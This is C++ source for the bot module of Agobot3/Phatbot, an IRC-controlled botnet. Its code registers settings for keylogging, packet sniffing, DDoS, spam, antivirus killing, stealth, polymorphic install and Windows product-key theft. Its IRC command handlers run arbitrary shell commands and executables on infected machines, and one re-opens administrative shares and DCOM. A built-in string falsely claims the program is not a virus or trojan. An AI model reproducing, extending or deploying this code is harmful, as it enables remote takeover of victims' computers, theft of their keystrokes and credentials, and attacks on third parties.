/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"

CBot::CBot() { m_bJoined=false; }

/* No Comment :P */

void CBot::Init()
{	init_random();
	CString sTemp;		sTemp.Format("%d", brandom(1024, 32000));
	CString sTempFTP;	sTempFTP.Format("%d", brandom(1024, 32000));
	CString warning;    warning.Format("***ATTENTION*** NortonBot is protected under international copyright laws. Any attempt to dissassemble or alter this file is a violation of international copyright law. NortonBot is NOT intended to be a virus or trojan.");

	REGCVAR(bot_ftrans_port,		sTemp.CStr(),		"Bot - File Transfer Port",						false,	0	);
	REGCVAR(bot_ftrans_port_ftp,	sTempFTP.CStr(),	"Bot - File Transfer Port for FTP",				false,	0	);
	REGCVAR(si_chanpass,			"",					"Server Info - Channel Password",				false,	0	);
	REGCVAR(si_mainchan,			"",					"Server Info - Main Channel",					false,	0	);
	REGCVAR(si_nickprefix,			"",					"Server Info - Nickname prefix",				false,	0	);
	REGCVAR(si_port,				"",					"Server Info - Server Port",					false,	0	);
	REGCVAR(si_server,				"",					"Server Info - Server Address",					false,	0	);
	REGCVAR(si_servpass,			"",					"Server Info - Server Password",				false,	0	);
	REGCVAR(si_usessl,				"",					"Server Info - Use SSL ?",						false,	0	);
	REGCVAR(si_nick,				"",					"Server Info - Nickname",						false,	0	);
	REGCVAR(bot_version,			VERSION_PHATBOT,	"Bot - Version",								false,	0	);
	REGCVAR(bot_filename,			"",					"Bot - Runtime Filename",						false,	0	);
	REGCVAR(bot_id,					"",					"Bot - Current ID",								false,	0	);
	REGCVAR(bot_prefix,				"",					"Bot - Command Prefix",							false,	0	);
	REGCVAR(bot_timeout,			"",			    	"Bot - Timeout for receiving in miliseconds",	false,	0	);
	REGCVAR(bot_seclogin,			"",					"Bot - Enable login only by channel messages",	false,	0	);
	REGCVAR(bot_compnick,			"",					"Bot - Use the computer name as a nickname",	false,	0	);
	REGCVAR(bot_randnick,			"",					"Bot - Random nicks of Letters and Numbers",	false,	0	);
	REGCVAR(bot_meltserver,			"",					"Bot - Melt the original server file",			false,	0	);
	REGCVAR(bot_topiccmd,			"",					"Bot - Execute topic commands",					false,	0	);
	REGCVAR(do_speedtest,			"",					"Bot - Do speedtest on startup",				false,	0	);
	REGCVAR(do_avkill,				"",					"Bot - Enable AV kill",							false,	0	);
	REGCVAR(do_stealth,				"",					"Bot - Enable Stealth",							false,	0	);
	REGCVAR(as_valname,				"",					"Autostart - Value Name",						false,	0	);
	REGCVAR(as_enabled,				"",					"Autostart - Enabled",							false,	0	);
	REGCVAR(as_service,				"",					"Autostart - Start as service",					false,	0	);
	REGCVAR(as_service_name,		"",					"Autostart - Short service name",				false,	0	);
	REGCVAR(scan_maxthreads,		"",					"Scanner - Maximum Number of threads",			false,	0	);
	REGCVAR(scan_maxsockets,		"",					"Scanner - Maximum Number of sockets",			false,	0	);
	REGCVAR(ddos_maxthreads,		"",					"DDOS - Maximum Number of threads",				false,	0	);
	REGCVAR(redir_maxthreads,		"",					"Redirect - Maximum Number of threads",			false,	0	);
	REGCVAR(identd_enabled,			"",					"IdentD - Enable the server",					false,	0	);
	REGCVAR(cdkey_windows,			"",					"Return Windows Product Keys on cdkey.get",		false,	0	);
	REGCVAR(scaninfo_chan,			"",					"Scanner - Output channel",						false,	0	);
	REGCVAR(scaninfo_level,			"",					"Info Level 1(less) - (3)more",					false,	0	);
	REGCVAR(spam_aol_channel,		"",					"AOL Spam - Channel name",						false,	0	);
	REGCVAR(spam_aol_enabled,		"",					"AOL Spam - Enabled ?",							false,	0	);
	REGCVAR(sniffer_enabled,		"",					"Sniffer - Enabled ?",							false,	0	);
	REGCVAR(sniffer_channel,		"",					"Sniffer - Output channel",						false,	0	);
	REGCVAR(vuln_channel,			"",					"Vuln Daemon Sniffer Channel",					false,	0	);
	REGCVAR(keylog_enabled,			"",					"Keylogger - Enabled ?",						false,	0	);
	REGCVAR(keylog_channel,			"",					"KeyLogger Channel",							false,	0	);
	REGCVAR(inst_polymorph,			"",					"Installer - Polymorph on install ?",			false,	0	);

	Config();

	REGCMD(m_cmdAbout,			"bot.about",		"displays the info the author wants you to see",	false,	this);
	REGCMD(m_cmdDie,			"bot.die",			"terminates the bot",								false,	this);
	REGCMD(m_cmdDns,			"bot.dns",			"resolves ip/hostname by dns",						false,	this);
	REGCMD(m_cmdExecute,		"bot.execute",		"makes the bot execute a .exe",						false,	this);
	REGCMD(m_cmdId,				"bot.id",			"displays the id of the current code",				false,	this);
	REGCMD(m_cmdNick,			"bot.nick",			"changes the nickname of the bot",					false,	this);
	REGCMD(m_cmdOpen,			"bot.open",			"opens a file (whatever)",							false,	this);
	REGCMD(m_cmdRemove,			"bot.remove",		"removes the bot",									false,	this);
	REGCMD(m_cmdRemoveAllBut,	"bot.removeallbut",	"removes the bot if id does not match",				false,	this);
	REGCMD(m_cmdRndNick,		"bot.rndnick",		"makes the bot generate a new random nick",			false,	this);
	REGCMD(m_cmdStatus,			"bot.status",		"gives status",										false,	this);
	REGCMD(m_cmdSysInfo,		"bot.sysinfo",		"displays the system info",							false,	this);
	REGCMD(m_cmdLongUptime,		"bot.longuptime",	"If uptime > 7 days then bot will respond",			false,	this);
	REGCMD(m_cmdHighSpeed,		"bot.highspeed",	"If speed > 5000 then bot will respond",			false,	this);
	REGCMD(m_cmdQuit,			"bot.quit",			"quits the bot",									false,	this);
	REGCMD(m_cmdFlushDNS,		"bot.flushdns",		"flushes the bots dns cache",						false,	this);
	REGCMD(m_cmdSecure,			"bot.secure",		"delete shares / disable dcom",						false,	this);
	REGCMD(m_cmdUnSecure,		"bot.unsecure",		"enable shares / enable dcom",						false,	this);
	REGCMD(m_cmdCommand,		"bot.command",		"runs a command with system()",						false,	this);

	CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
	g_pMainCtrl->m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
	m_lStartTime=(unsigned long)GetTickCount()/1000;
}


void CBot::Recv(CMessage *pMsg, bool bInternal)
{
#ifdef DBGCONSOLE
	if(pMsg->sDest[0]=='#')
		g_pMainCtrl->m_cConsDbg.Log(5, "<%s> %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
	else
		g_pMainCtrl->m_cConsDbg.Log(5, "*%s* %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif

	if(pMsg->sDest[0]=='#') pMsg->sReplyTo.Assign(pMsg->sDest); else pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bNotice) pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bOutchan) {
		CString sOutchan; sOutchan.Assign(pMsg->sChatString.Mid(pMsg->sChatString.Find(" -o")+3));
		pMsg->sReplyTo.Assign(sOutchan);
	}
	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));

	// Check if its a bot command by comparing the first byte to the bot_prefix value
	if(pMsg->sChatString[0]==bot_prefix.sValue[0]) {
		if(!pMsg->sCmd.Compare("bot.repeat")) {
			if(!pMsg->sChatString.Token(1, " ").Compare("")) return;
			int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iNum) return;
			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
			sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
			pMsg->sChatString.Assign(sNewCStr); pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
			if(!bInternal)
				for(i=0;i<iNum;i++) HandleMsg(pMsg);
			else
				for(i=0;i<iNum;i++) HandleMsgInt(pMsg);
		} else
			if(!bInternal)
				HandleMsg(pMsg);
			else
				HandleMsgInt(pMsg);
	} else if(pMsg->sChatString.Token(0, " ").Find(g_pMainCtrl->m_sUserName)) {
		// botname .command mod - deejayfuzion
		CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
		pMsg->sChatString.Assign(sNewCStr);
		pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " "));
		this->Recv(pMsg, bInternal);
	} else {
		// fallback handler
		HandleFallBack(pMsg);
	}
}

bool CBot::HandleMsg(CMessage *pMsg)
{	// If it's no login command and the user isn't logged in yet, break
	if(pMsg->sCmd.Compare("login") && !g_pMainCtrl->m_cMac.FindLogin(pMsg->sSrc)) return false;
	else
	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
		if(!g_pMainCtrl->m_cMac.FindLogin(pMsg->sSrc))
			if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#') return false;
		return HandleMsgInt(pMsg); } }

bool CBot::HandleMsgInt(CMessage *pMsg)
{	// Find the command using the command handler
	command *pCommand=g_pMainCtrl->m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
	// If the command is found, let the command hander handle it
	if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; }

bool CBot::HandleFallBack(CMessage *pMsg)
{	// Fail if sender isn't logged in, no way to login via fallback
	if(!g_pMainCtrl->m_cMac.FindLogin(pMsg->sSrc)) return false;
	// Distribute to the active fallback handler
	command *pCommand=g_pMainCtrl->m_cCommands.FindFallBack();
	// If the command is found, let the command hander handle it
	if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; }

bool CBot::Think()
{	static unsigned long lLastAVKill;

	// If the IRC connection timed out, reset it
	if((GetTickCount()-g_pMainCtrl->m_cIRC.m_lLastRecv) > bot_timeout.iValue)
	{	g_pMainCtrl->m_cIRC.Fail(); g_pMainCtrl->m_cIRC.m_lLastRecv=GetTickCount(); }

#ifndef DEBUG
	// Kill all AV processes every 20 seconds
	if(g_pMainCtrl->m_cBot.do_avkill.bValue){
		if((GetTickCount()-lLastAVKill) > 20000)
		{	KillAV(); lLastAVKill=GetTickCount(); }}
#endif

	return true; }

bool CBot::HandleCommand(CMessage *pMsg)
{	
	if(!pMsg->sCmd.Compare("bot.remove") || !pMsg->sCmd.Compare("bot.removeallbut")) {
		CString sId(pMsg->sChatString.Token(1, " ", true));
		if(!pMsg->sCmd.Compare("bot.removeallbut")) if(!sId.Compare(g_pMainCtrl->m_cBot.bot_id.sValue)) return false;
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "removing bot...", pMsg->sReplyTo);
		g_pMainCtrl->m_cBot.RunScript(SCRIPT_ONREMOVE);
#ifdef WIN32
		/// should unsecure system as remove bot to allow recycling //
		
		// Set EnableDCOM to "Y"
		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		strcpy(szDataBuf, "Y"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);

		// UnSecure Shares
		Execute("net.exe", "net share c$=c:\\");
		Execute("net.exe", "net share d$=d:\\");
		Execute("net.exe", "net share e$=e:\\");
		Execute("net.exe", "net share ipc$");
		Execute("net.exe", "net share admin$");

		// Delete Autostart
		if(g_pMainCtrl->m_cBot.as_enabled.bValue)
			g_pMainCtrl->m_cInstaller.RegStartDel(g_pMainCtrl->m_cBot.as_valname.sValue);
		if(g_pMainCtrl->m_cBot.as_service.bValue)
			ServiceDel(g_pMainCtrl->m_cBot.as_service_name.sValue);
#endif
		g_pMainCtrl->m_cScanner.m_bScanning=false;
		g_pMainCtrl->m_cScanner.m_cmdStop;
		g_pMainCtrl->m_cInstaller.Uninstall();
		// g_pMainCtrl->m_cIRC.m_bRunning=false; g_pMainCtrl->m_bRunning=false;
#ifdef _WIN32
		ExitProcess(0);
#else
		exit(0);
#endif // _WIN32
	}

	else if(!pMsg->sCmd.Compare("bot.execute")) {
		CString sText(pMsg->sChatString.Token(2, " ", true)); bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
#ifdef WIN32
		CString sTextExp; ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
		sText.Assign(sTextExp); PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO)); sinfo.cb=sizeof(sinfo);
		if(bVisible) sinfo.wShowWindow=SW_SHOW; else sinfo.wShowWindow=SW_HIDE;
		if(!CreateProcess(NULL, sText.Str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
#else
		CString sCmdBuf; sCmdBuf.Format("/bin/sh -c \"%s\"", sText.CStr());
		if(system(sCmdBuf.CStr())==-1) { g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
#endif
		return true; }

	else if(!pMsg->sCmd.Compare("bot.open")) {
		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
#ifdef WIN32
		bRet=(int)ShellExecute(0, "open", sText.CStr(), NULL, NULL, SW_SHOW)>=32;
#else
		bRet=system(sText.CStr())>0;
#endif
		if(bRet) return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "file opened.", pMsg->sReplyTo.Str());
		else return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't open file.", pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.dns")) {
		CString sReply; hostent *pHostent=NULL; in_addr iaddr;
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		unsigned long addr=inet_addr(pMsg->sChatString.Token(1, " ").CStr());
	
		if(addr!=INADDR_NONE) {
			pHostent=gethostbyaddr((char*)&addr, sizeof(struct in_addr), AF_INET);
			if(pHostent) {
				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), pHostent->h_name);
				return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); }
		} else {
			pHostent=gethostbyname(pMsg->sChatString.Token(1, " ").CStr());
			if(pHostent) {
				iaddr=*((in_addr*)*pHostent->h_addr_list);
				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), inet_ntoa(iaddr));
				return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }
		
		if(!pHostent) {
			sReply.Format("couldn't resolve host \"%s\"!", pMsg->sChatString.Token(1, " ").CStr());
			return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }

	else if(!pMsg->sCmd.Compare("bot.about")) {
		CString sReplyBuf; sReplyBuf.Format("%s", g_pMainCtrl->m_sNameVerStr.CStr());
		return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.id")) {
		return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bot_id.sValue.Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.nick")) {
		g_pMainCtrl->m_sUserName.Format("%s", pMsg->sChatString.Token(1, " ", true).Mid(0, 32).CStr());
		g_pMainCtrl->m_cIRC.SendRawFormat("NICK %s\r\n", g_pMainCtrl->m_sUserName.CStr());
		return true; }

	else if(!pMsg->sCmd.Compare("bot.quit") || !pMsg->sCmd.Compare("bot.die")) {
		g_pMainCtrl->m_cIRC.m_bRunning=false; return true; }

	else if(!pMsg->sCmd.Compare("bot.sysinfo")) {
		return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, SysInfo().Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.longuptime")) {
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) iDays=7;
		CString sUptime=LongUptime(iDays);
		if(sUptime.Compare("")) {
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				sUptime.Str(), pMsg->sReplyTo.Str()); }
		return true; }

	else if(!pMsg->sCmd.Compare("bot.highspeed")) {
		int iSpeed=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iSpeed) iSpeed=10000;
		CString sSpeed=g_pMainCtrl->m_cStartupThread.m_speedData.lTotalSpeed;
		if (iSpeed <= atoi(sSpeed.CStr()))
		{
		if(sSpeed.Compare("")) {
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, \
				pMsg->sReplyTo.Str(), "Speed: %s kbit/s", sSpeed.Str()); }
		}
		return true; }

	else if(!pMsg->sCmd.Compare("bot.status")) {
		return g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, Status().Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.rndnick")) {
		CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
		g_pMainCtrl->m_cIRC.SendRawFormat("NICK %s\r\n", sRndNick.CStr());
		g_pMainCtrl->m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
		return true; }

	else if(!pMsg->sCmd.Compare("bot.flushdns")) {
#ifdef WIN32
		Execute("ipconfig.exe", "/flushdns");
#else
		Execute("nscd", "-i hosts");
#endif // WIN32
		return true; }

	else if(!pMsg->sCmd.Compare("bot.secure")) {	
#ifdef WIN32
		// Set EnableDCOM to "N"
		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		strcpy(szDataBuf, "N"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);

		/* begin removal of (most)Bagle/(some)MyDoom */
		
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "Ssate.exe");
		RegCloseKey(hkey);
		KillProcess("irun4.exe");
		CString tmpBagle; GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"irun4.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "rate.exe");
		RegCloseKey(hkey);
		KillProcess("i11r54n4.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"i11r54n4.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "ssate.exe");
		RegCloseKey(hkey);
		KillProcess("winsys.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"winsys.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "d3dupdate.exe");
		RegCloseKey(hkey);
		KillProcess("bbeagle.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"bbeagle.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "TaskMon");
		RegCloseKey(hkey);
		KillProcess("taskmon.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"taskmon.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "Explorer");
		RegCloseKey(hkey);

		/* end removal of (most)Bagle/(some)MyDoom */

		/* begin removal of suspicious exe/services */

		ServiceDel((CString)"upnphost"); // secure UPNP

		/* end removal of suspicious exe/services */

		// Secure Shares
		system("net share c$ /delete /y");
		system("net share d$ /delete /y");
		system("net share ipc$ /delete /y");
		system("net share admin$ /delete /y");

		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Bot Secured", pMsg->sReplyTo.Str());

#endif
		return true; }


	else if(!pMsg->sCmd.Compare("bot.unsecure")) {	
#ifdef WIN32
		// Set EnableDCOM to "Y"
		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		strcpy(szDataBuf, "Y"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);

		// UnSecure Shares
		system("net share c$=c:\\");
		system("net share d$=d:\\");
		system("net share e$=e:\\");
		system("net share ipc$");
		system("net share admin$");

		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Bot UnSecured", pMsg->sReplyTo.Str());
#endif

		return true; }




	
	else if(!pMsg->sCmd.Compare("bot.command")) {	
#ifdef WIN32
		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
		CString sReplyBuf; sReplyBuf.Format("command (%s) executed.", sText.CStr());

		if(system(sText.CStr())==-1) { g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute command.", pMsg->sReplyTo.Str()); return false; }
		else { g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str()); return false; }
#endif
		return true; }


	return false; }

CString CBot::SysInfo()
{	CString sSysInfo;
#ifdef WIN32
	int total=GetTickCount()/1000;
	MEMORYSTATUS memstat; OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); GetVersionEx(&verinfo); char *os; char os2[140];
	if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
	{	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; }
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==10)	os="98";
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==90)	os="ME";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==0)		os="2000";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==1)		os="XP";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==2)		os="2003";
	else																os="???";

	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0]!='\0')
	{	sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion); os=os2; }
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	// *** PhaTTy <MOD> Changed ram: to ##MB/##MB , added box: , added user: </MOD>

	sSysInfo.Format("cpu: %dMHz ram: %dMB/%dMB os: %s up: %dd %dh %dm box: %s freespace: %s",
	cpuspeed(), memstat.dwAvailPhys/1046528, memstat.dwTotalPhys/1046528, os, total/86400, (total%86400)/3600, ((total%86400)%3600)/60, szCompname, GetFreeDiskSpace().CStr());


#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2;
	
	if(!fp) return CString("Error: Can't open /proc/uptime!");

	if(fscanf(fp, "%f %f", &f1, &f2)<2) return CString("Error: Invalid or changed /proc/uptime format!");

	fclose(fp);
	
	int days, hours, minutes;
	days=((abs((int)f1)/60)/60)/24;
	hours=((abs((int)f1)/60)/60)%24;
	minutes=(abs((int)f1)/60)%60;

	int iDistro=GetDistro(); char *szVersion; char *szKVersion;
	bool bGotVer=GetVersion(&szVersion, iDistro);
	bool bGotKVer=GetKVersion(&szKVersion, iDistro);
	
	if(!bGotVer) szVersion="Unknown\n"; if(!bGotKVer) szKVersion="Unknown\n";
	
	sSysInfo.Format("cpu: %dMHz. os: %s. kernel: %s. uptime: %dd %dh %dm", cpuspeed(), szVersion, szKVersion, days, hours, minutes);

	if(bGotVer) free(szVersion); if(bGotKVer) free(szKVersion);
#endif
	return sSysInfo; }

int CBot::UptimeDays() {
#ifdef WIN32
	int total=GetTickCount()/1000;
	OSVERSIONINFO verinfo;
	return total/86400;
#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2; if(!fp) return 0;
	if(fscanf(fp, "%f %f", &f1, &f2)<2) { fclose(fp); return 0; }
	return ((abs((int)f1)/60)/60)/24;
#endif // WIN32
}

CString CBot::LongUptime(int iDays)  // If uptime > iDays days then bot will reply with uptime stats. - PhaTTy
{	CString sLongUptime;
	if (iDays == 0) return false;
	int total=GetTickCount()/1000;

	if(total/86400 >= iDays) sLongUptime.Format("uptime: %dd %dh %dm",total/86400, (total%86400)/3600, ((total%86400)%3600)/60);
	else return CString("");
	return sLongUptime; }

CString CBot::Status()
{	CString sStatus; unsigned long total, days, hours, minutes; total=(GetTickCount()/1000)-m_lStartTime;
	days=total/86400; hours=(total%86400)/3600; minutes=((total%86400)%3600)/60;
	sStatus.Format("%s ready. Up %dd %dh %dm.", g_pMainCtrl->m_sNameVerStr.CStr(), days, hours, minutes); return sStatus; }
